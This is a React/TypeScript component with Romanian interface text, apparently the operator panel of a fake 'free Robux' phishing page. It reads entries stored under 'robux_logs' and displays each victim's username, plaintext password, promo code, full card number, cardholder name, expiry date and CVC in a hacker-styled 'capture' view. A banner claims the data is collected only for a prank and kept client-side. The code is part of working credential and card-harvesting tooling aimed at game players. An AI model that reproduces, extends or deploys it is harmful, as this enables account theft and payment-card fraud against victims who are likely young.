
import React, { useState, useEffect } from 'react';
import { StoredEntry } from '../types';

interface AdminPanelProps {
  onBack: () => void;
}

const AdminPanel: React.FC<AdminPanelProps> = ({ onBack }) => {
  const [logs, setLogs] = useState<StoredEntry[]>([]);
  const [accessTime] = useState(new Date().toLocaleTimeString());
  const [activeCard, setActiveCard] = useState<number | null>(null);

  useEffect(() => {
    const data = JSON.parse(localStorage.getItem('robux_logs') || '[]');
    setLogs(data);
  }, []);

  const clearLogs = () => {
    if (window.confirm('Ești sigur că vrei să ștergi toate înregistrările?')) {
      localStorage.removeItem('robux_logs');
      setLogs([]);
    }
  };

  const getCardType = (number: string = '') => {
    const firstDigit = number.charAt(0);
    if (firstDigit === '4') return 'VISA';
    if (firstDigit === '5') return 'MASTERCARD';
    return 'GENERIC';
  };

  return (
    <div className="w-full max-w-6xl h-[85vh] flex flex-col bg-[#050505] border-2 border-green-500/20 rounded-2xl overflow-hidden font-mono shadow-[0_0_80px_rgba(34,197,94,0.1)] transition-all animate-in fade-in zoom-in duration-500 relative">
      <div className="absolute inset-0 opacity-[0.03] pointer-events-none" style={{ backgroundImage: 'linear-gradient(#22c55e 1px, transparent 1px), linear-gradient(90deg, #22c55e 1px, transparent 1px)', backgroundSize: '40px 40px' }}></div>

      <div className="bg-green-500/5 border-b border-green-500/20 p-5 flex justify-between items-center z-10">
        <div className="flex items-center gap-4">
          <div className="flex gap-1.5">
            <div className="w-3 h-3 bg-red-500/50 rounded-full"></div>
            <div className="w-3 h-3 bg-yellow-500/50 rounded-full"></div>
            <div className="w-3 h-3 bg-green-500/50 rounded-full"></div>
          </div>
          <h1 className="text-green-500 font-black text-[10px] tracking-[0.4em] uppercase animate-pulse">
            TERMINAL_CAPTURE_V4.2 // DATABASE_ACTIVE
          </h1>
        </div>
        <div className="bg-green-500/20 text-green-500 text-[9px] px-3 py-1 rounded font-black tracking-widest">
          CONNECTED: {accessTime}
        </div>
      </div>

      <div className="flex-grow overflow-auto p-8 relative z-10 scrollbar-thin scrollbar-thumb-green-500/20">
        <div className="mb-10 flex gap-4">
          <button onClick={onBack} className="px-6 py-2.5 bg-green-500/10 border border-green-500/30 text-green-500 hover:bg-green-500 hover:text-black font-black transition-all text-[10px] uppercase tracking-widest">
            [ ESC ] REVENIRE SITE
          </button>
          <button onClick={clearLogs} className="px-6 py-2.5 border border-red-500/30 text-red-500 hover:bg-red-500 hover:text-white transition-all text-[10px] uppercase tracking-widest font-black">
            [ DEL ] RESETEAZĂ LOGS
          </button>
        </div>

        <div className="space-y-4">
          {logs.length === 0 ? (
            <div className="h-64 flex flex-col items-center justify-center border border-dashed border-green-500/10 rounded-2xl bg-green-500/5">
              <div className="text-green-900 text-sm mb-2 italic tracking-[0.3em] uppercase">-- Nicio captură detectată --</div>
              <div className="w-24 h-0.5 bg-green-900/20 rounded-full overflow-hidden">
                <div className="w-full h-full bg-green-500/40 animate-shimmer"></div>
              </div>
            </div>
          ) : (
            logs.map((log, idx) => (
              <div key={idx} className={`border border-green-500/10 rounded-2xl p-6 transition-all duration-500 ${activeCard === idx ? 'bg-green-500/5 border-green-500/30 shadow-[0_0_30px_rgba(34,197,94,0.05)]' : 'bg-transparent hover:border-green-500/30'}`}>
                <div className="flex flex-col lg:flex-row justify-between items-center gap-6">
                  <div className="flex-grow flex items-center gap-6">
                    <span className="text-green-500/10 font-black text-3xl">{(idx + 1).toString().padStart(2, '0')}</span>
                    <div className="space-y-1">
                      <div className="flex items-center gap-3">
                        <span className="text-blue-400 font-black text-xl uppercase tracking-tighter">{log.username}</span>
                        <div className="h-4 w-px bg-green-500/20"></div>
                        <span className="text-green-500/40 text-[9px] font-bold tracking-widest">{log.timestamp}</span>
                      </div>
                      <div className="flex gap-6 text-[10px]">
                        <span className="text-yellow-600 font-black uppercase tracking-widest">PWD: <span className="text-yellow-400 select-all font-bold">{log.password}</span></span>
                        <span className="text-purple-600 font-black uppercase tracking-widest">CODE: <span className="text-purple-400">{log.promoCode}</span></span>
                      </div>
                    </div>
                  </div>
                  <button 
                    onClick={() => setActiveCard(activeCard === idx ? null : idx)}
                    className={`px-8 py-3 rounded-xl border font-black text-[10px] uppercase tracking-widest transition-all ${activeCard === idx ? 'bg-green-500 text-black border-green-500 shadow-lg' : 'bg-transparent border-green-500/30 text-green-500 hover:border-green-500'}`}
                  >
                    {activeCard === idx ? 'ASCUNDE DATE' : 'VEZI DATE CARD'}
                  </button>
                </div>

                {activeCard === idx && (
                  <div className="mt-8 animate-in slide-in-from-top-4 duration-500 grid grid-cols-1 md:grid-cols-2 gap-10 items-center border-t border-green-500/10 pt-8">
                    <div className="relative w-full max-w-sm h-52 bg-gradient-to-br from-[#111] to-[#000] rounded-2xl p-8 shadow-2xl ring-1 ring-white/5 overflow-hidden flex flex-col justify-between">
                      <div className="absolute top-0 right-0 p-6 opacity-5">
                        <svg className="w-24 h-24" viewBox="0 0 24 24" fill="white"><path d="M2 8.5H22M6 12.5H8M10 12.5H14M2 5H22V19H2V5Z" /></svg>
                      </div>
                      
                      <div className="flex justify-between items-start">
                        <div className="w-10 h-8 bg-yellow-600/20 rounded border border-yellow-600/30 flex flex-col justify-center gap-1 p-1.5">
                           <div className="h-0.5 w-full bg-yellow-600/40"></div>
                           <div className="h-0.5 w-full bg-yellow-600/40"></div>
                        </div>
                        <div className="text-white/20 font-black text-[10px] tracking-widest">{getCardType(log.cardNumber)}</div>
                      </div>

                      <div className="text-xl md:text-2xl font-mono text-white tracking-[0.15em] drop-shadow-md select-all text-center">
                        {log.cardNumber || 'FĂRĂ DATE'}
                      </div>

                      <div className="flex justify-between items-end border-t border-white/5 pt-4">
                        <div className="flex flex-col">
                          <span className="text-[7px] text-white/20 font-black uppercase">TITULAR</span>
                          <span className="text-[10px] font-black text-white uppercase truncate max-w-[150px]">{log.cardName || '---'}</span>
                        </div>
                        <div className="flex flex-col items-end">
                          <span className="text-[7px] text-white/20 font-black uppercase">VALABILITATE</span>
                          <span className="text-[10px] font-black text-white">{log.expiry || '--/--'}</span>
                        </div>
                      </div>
                    </div>

                    <div className="space-y-4">
                      <div className="bg-black/80 p-6 rounded-2xl border border-green-500/10 space-y-4 shadow-inner">
                         <div className="flex justify-between items-center">
                           <span className="text-[10px] text-green-900 font-black uppercase tracking-widest">COD CVC / CVV:</span>
                           <span className="text-red-500 font-black text-3xl tracking-widest bg-red-500/5 px-4 py-1 rounded-lg border border-red-500/10 shadow-[0_0_15px_rgba(239,68,68,0.2)]">{log.cvc || '???'}</span>
                         </div>
                         <div className="h-px bg-green-500/5"></div>
                         <div className="text-[8px] text-green-800 leading-relaxed uppercase font-black tracking-[0.2em] italic">
                            CRITICAL_DATA: ACESTE DATE SUNT PENTRU UZ EXCLUSIV ÎN SCOPUL FARSEI. 
                            STOCAREA ESTE LOCALĂ (CLIENT-SIDE).
                         </div>
                      </div>
                    </div>
                  </div>
                )}
              </div>
            ))
          )}
        </div>
      </div>

      <div className="bg-green-500/5 p-3 border-t border-green-500/10 text-[8px] text-green-900 flex justify-between font-black tracking-widest z-10 uppercase">
        <div className="flex gap-6">
          <span className="animate-pulse">● MONITORING_IN_PROGRESS</span>
          <span>SYSLOG: OK</span>
        </div>
        <span>CAPTURED_V4.2 // (C) 2024 DEEP_SYSTEMS</span>
      </div>
    </div>
  );
};

export default AdminPanel;
